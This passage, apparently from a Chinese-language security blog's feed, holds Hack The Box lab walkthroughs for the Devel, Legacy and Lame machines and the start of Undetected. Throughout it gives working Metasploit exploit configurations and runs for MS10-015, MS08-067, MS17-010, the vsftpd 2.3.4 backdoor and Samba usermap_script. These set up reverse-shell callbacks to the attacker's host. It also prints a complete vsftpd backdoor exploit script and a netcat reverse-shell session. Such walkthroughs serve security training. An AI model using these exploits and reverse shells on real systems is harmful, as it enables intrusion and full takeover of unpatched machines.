[*] Post module execution completed 使用post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester作为提权辅助脚本 这里测试出来可以使用的提权exp挺多的，我们就拿第一个吧 use exploit/windows/local/ms10_015_kitrap0d set session 1 set lhost 10.10.16.2 msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) 设置好以后，执行 msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Launching notepad to host the exploit... [+] Process 3972 launched. [*] Reflectively injecting the exploit DLL into 3972... [*] Injecting exploit into 3972 ... [*] Exploit injected. Injecting payload into 3972... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 2 opened (10.10.16.2:4444 -&gt; 10.10.10.5:49163) at 2022-03-03 02:44:09 -0500 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 2 Meterpreter : x86/windows 成功拿到system权限 meterpreter &gt; search -f user.txt Found 1 result... c:\\Users\\babis\\Desktop\\user.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\babis\\Desktop\\user.txt&#39; 489b24475e33a86c802d19db5fbd40e1 meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; af3b66607827cd5c2153fdbfff2a558a 成功拿到user和root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Legacy - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Legacy","date":"2022-03-02T11:38:36.000Z","updated":"2023-06-13T03:46:21.000Z","comments":true,"path":"2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/","link":"","permalink":"http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/","excerpt":"","text":"Hackthebox - Legacy靶场信息 靶场类型 信息搜集NmapStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:06 EST Nmap scan report for 10.10.10.4 Host is up (0.54s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Device type: general purpose|specialized Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%) OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2 Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d00h57m39s, deviation: 1h24m49s, median: 4d23h57m40s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:e2:3e (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-03-07T09:04:30+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 541.52 ms 10.10.16.1 2 541.58 ms 10.10.10.4 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.31 seconds Samba┌──(root💀kali)-[~/Desktop/HTB/Easy/Legacy] └─# nmap -p445 --min-rate 5000 --script=vuln 10.10.10.4 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:10 EST Nmap scan report for 10.10.10.4 Host is up (0.24s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds 使用vuln插件扫描445端口的smb后发现存在两个漏洞，MS08-067和MS17-010，分别去利用一下试试 漏洞利用MS08-067msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.4 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Targeting 使用指定的exp并设置好配置信息后，输入exploit执行 msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] 10.10.10.4:445 - Automatically detecting the target... [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.10.10.4:445 - Attempting to trigger the vulnerability... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] Meterpreter session 2 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1032) at 2022-03-02 00:21:27 -0500 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : LEGACY OS : Windows XP (5.1 Build 2600, Service Pack 3). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 1 Meterpreter : x86/windows 成功获得system权限 MS17-010设置好配置后输入exploit执行 msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave blank for auto) NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.10.4 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic 执行成功 msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] 10.10.10.4:445 - Target OS: Windows 5.1 [*] 10.10.10.4:445 - Filling barrel with fish... done [*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt; [*] 10.10.10.4:445 - [*] Preparing dynamite... [*] 10.10.10.4:445 - [*] Trying stick 1 (x86)...Boom! [*] 10.10.10.4:445 - [+] Successfully Leaked Transaction! [*] 10.10.10.4:445 - [+] Successfully caught Fish-in-a-barrel [*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt; [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81abb3c8 [*] 10.10.10.4:445 - Built a write-what-where primitive... [+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.4:445 - Selecting native target [*] 10.10.10.4:445 - Uploading payload... uercgOUf.exe [*] 10.10.10.4:445 - Created \\uercgOUf.exe... [+] 10.10.10.4:445 - Service started successfully... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] 10.10.10.4:445 - Deleting \\uercgOUf.exe... [*] Meterpreter session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1033) at 2022-03-02 00:31:20 -0500 查看一下系统信息和权限 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; sysinfo Computer : LEGACY OS : Windows XP (5.1 Build 2600, Service Pack 3). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 1 Meterpreter : x86/windows Flagmeterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\john\\Desktop\\user.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\john\\Desktop\\user.txt&#39; e69af0e4f443de7e36876fda4ec7644f meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &quot;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&quot; 993442d258b0e0ec917cae9e695d5713 meterpreter &gt; 查找并成功拿到flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Lame - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Lame","date":"2022-03-01T11:38:36.000Z","updated":"2023-06-13T03:45:59.000Z","comments":true,"path":"2022/03/01/Hackthebox/Easy/Hackthebox-Lame/","link":"","permalink":"http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/","excerpt":"","text":"Hackthebox - Lame靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 00:25 EST Nmap scan report for 10.10.10.3 Host is up (0.51s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h30m20s, deviation: 3h32m12s, median: 17s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-03-01T00:26:29-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 503.51 ms 10.10.16.1 2 503.58 ms 10.10.10.3 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.36 seconds 漏洞利用Ftp这边FTP的版本是vsftpd 2.3.4，我寻思可能有漏洞，去搜索一下看看 ┌──(root💀kali)-[~/Desktop] └─# searchsploit vsftpd 2.3.4 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这里有两个后门漏洞执行，其中一个还是msf的，去利用看看 Metasploitmsf6 &gt; search vsftpd 2.3.4 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution 咱们使用它来利用漏洞 msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 21 yes The target port (TCP) Payload options (cmd/unix/interact): Name Current Setting Required Description ---- --------------- -------- ----------- Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.3 rhosts =&gt; 10.10.10.3 msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4) [*] 10.10.10.3:21 - USER: 331 Please specify the password. whoami [*] Exploit completed, but no session was created. msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; whoami [*] exec: whoami root 这边确实执行成功了我们的命令，但是没有获得一个可用的shell，这并不符合我们的目的，而且我的原则一向是能不使用msf就不使用 我们来看看另一个漏洞 Exploit┌──(root💀kali)-[~/Desktop] └─# searchsploit vsftpd 2.3.4 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ┌──(root💀kali)-[~/Desktop] └─# locate unix/remote/49757.py /usr/share/exploitdb/exploits/unix/remote/49757.py ┌──(root💀kali)-[~/Desktop] └─# cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~/Desktop/Exploit.py 给复制到桌面，然后我们去查看一下 # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution # Date: 9-04-2021 # Exploit Author: HerculesRD # Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html # Version: vsftpd 2.3.4 # Tested on: debian # CVE : CVE-2011-2523 #!/usr/bin/python3 from telnetlib import Telnet import argparse from signal import signal, SIGINT from sys import exit def handler(signal_received, frame): # Handle any cleanup here print(&#39; [+]Exiting...&#39;) exit(0) signal(SIGINT, handler) parser=argparse.ArgumentParser() parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str) args = parser.parse_args() host = args.host portFTP = 21 #if necessary edit this line user=&quot;USER nergal:)&quot; password=&quot;PASS pass&quot; tn=Telnet(host, portFTP) tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line tn.write(user.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn.read_until(b&quot;password.&quot;) #if necessary, edit this line tn.write(password.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn2=Telnet(host, 6200) print(&#39;Success, shell opened&#39;) print(&#39;Send `exit` to quit shell&#39;) tn2.interact() 这边我尝试利用后，发现利用失败了 换个其他思路看看 Samba┌──(root💀kali)-[~/Desktop/HTB/Easy/Lame] └─# searchsploit Samba 3.0.20 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit) | unix/remote/16320.rb Samba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba &lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这边也是有一个msf的脚本，先用用看吧 使用msfconsole启动msf msf6 &gt; search Samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba &quot;username map script&quot; Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6 &gt; use 0 [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) &gt; use exploit/multi/samba/usermap_script [*] Using configured payload cmd/unix/reverse_netcat 然后查看一下需要修改哪些配置 msf6 exploit(multi/samba/usermap_script) &gt; options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.200.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic 然后咱们开始修改 msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3 rhosts =&gt; 10.10.10.3 msf6 exploit(multi/samba/usermap_script) &gt; set rport 445 rport =&gt; 445 msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.16.2 lhost =&gt; 10.10.16.2 然后开始利用 msf6 exploit(multi/samba/usermap_script) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Command shell session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.3:45192) at 2022-03-01 01:05:18 -0500 whoami root 成功拿到root权限 然后输入shell进入shell控制模式 root@lame:/# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) root@lame:/home/makis# cat user.txt cat user.txt 7547181b7a57b001cf0ba3f497b5e8b0 在&#x2F;home&#x2F;makis&#x2F;user.txt中找到了user权限的flag文件 root@lame:/home/makis# cd /root cd /root root@lame:/root# ls ls Desktop reset_logs.sh root.txt vnc.log root@lame:/root# cat root.txt cat root.txt a07cd9e7c60b75852e396c4320f5fae4 在&#x2F;root&#x2F;root.txt中找到了root权限的flag 其他思路基于可以不用自动化工具就不用的原则，咱们这里找到一个python的利用工具 https://github.com/ozuma/CVE-2007-2447 首先使用nc监听一个端口 然后进行利用 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Lame] └─# python3 Exploit.py 10.10.10.3 445 10.10.16.2 4444 格式分别是python3 利用工具 靶机IP 靶机端口 本地IP 本地端口 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 43672 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; root@lame:/# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) 这样在不使用msf的情况下，也成功拿到了root权限","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Undetected - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Undetected","date":"2022-02-25T11:38:36.000Z","updated":"2023-06-13T03:54:15.000Z","comments":true,"path":"2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/","link":"","permalink":"http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/","excerpt":"","text":"Hackthebox - Undetected靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 21:25 EST Nmap scan report for 10.10.11.146 Host is up (0.23s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Diana&#39;s Jewelry No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/24%OT=22%CT=1%CU=42918%PV=Y%DS=2%DC=T%G=Y%TM=62183E4 OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=C)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505 OS:ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6= OS:M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF= OS:Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y% OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD OS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 222.46 ms 10.10.14.1 2 222.61 ms 10.10.11.146 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.48 seconds nmap扫描后只看到22和80，那就去看看80端口吧 Http 这看着像是一家珠宝店的官网，先在网站上到处看看有没有啥可以利用的东西吧 点击STORE会跳转到store.djewelry.htb，加入hosts再看看 echo 10.10.11.146 djewelry.htb store.djewelry.htb &gt;&gt; /etc/hosts 进来以后是一个商城页面，到处看看功能点 这里提示网站已搬迁，去做个FUZZ看看 Fuzz┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://store.djewelry.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://store.djewelry.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ js [Status: 301, Size: 321, Words: 20, Lines: 10] images [Status: 301, Size: 325, Words: 20, Lines: 10] css [Status: 301, Size: 322, Words: 20, Lines: 10] fonts [Status: 301, Size: 324, Words: 20, Lines: 10] vendor [Status: 301, Size: 325, Words: 20, Lines: 10] server-status [Status: 403, Size: 283, Words: 20, Lines: 10] [Status: 200, Size: 6215, Words: 528, Lines: 196] :: Progress: [20116/20116] :: Job [1/1] :: 106 req/sec :: Duration: [0:03:03] :: Errors: 0 :: 挨个查看一下 在vendor里有不少东西，有点意思 &#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F; 在这个路径中可以看到版本更新记录，最后一个版本是5.6，查看一下ChangeLog-5.6.md # Changes in PHPUnit 5.6 All notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles. ## [5.6.2] - 2016-10-25 New PHAR release due to updated dependencies ## [5.6.1] - 2016-10-07 ### Fixed * Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()` ## [5.6.0] - 2016-10-07 ### Added * Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case&#39;s data set (for use in `setUp()`, for instance) * Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions * Added `PHPUnit\\Framework\\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith * Added the `@doesNotPerformAssertions` annotation for excluding a test from the &quot;useless test&quot; risky test check ### Changed * Deprecated `PHPUnit\\Framework\\TestCase::setExpectedExceptionRegExp()` * `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy` [5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2 [5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1 [5.6.0]: 